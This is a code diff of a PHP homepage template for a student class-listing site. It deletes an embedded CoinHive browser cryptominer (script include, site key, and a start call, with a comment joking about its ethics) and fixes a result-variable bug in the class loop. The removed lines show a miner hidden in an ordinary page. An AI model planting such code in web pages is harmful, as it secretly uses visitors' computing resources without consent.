@@ -28,14 +28,7 @@ include '../utilities/database.php';
     <link rel="stylesheet" href="../css/home.css">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
-    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
-    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <link rel="stylesheet" href="css/home.css">
-    <script>
-	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
-	      miner.start();
-    </script>
-    <!-- End questionable content -->
+
 
     <!-- The top banner of the webpage -->
     <div class="top">
@@ -70,8 +63,8 @@ include '../utilities/database.php';
 
       <?php
         //Get all the classes that this student is a part of and build the homepage
-        $class = getClasses($db, $_SESSION['id']);
-        while ($class = $result->fetch_assoc()) {
+        $classes = getClasses($db, $_SESSION['id']);
+        while ($class = $classes->fetch_assoc()) {
           $thisClass = getClass($db, $class['class_id']);
           echo '
                   <div class="col-md-6">
@@ -87,7 +80,7 @@ include '../utilities/database.php';
                   </div>
                 </div>
                 <br>';
-          if($class = $result->fetch_assoc()) {
+          if($class = $classes->fetch_assoc()) {
             $thisClass = getClass($db, $class['class_id']);
             echo '<div class="row">
                     <div class="col-md-6">
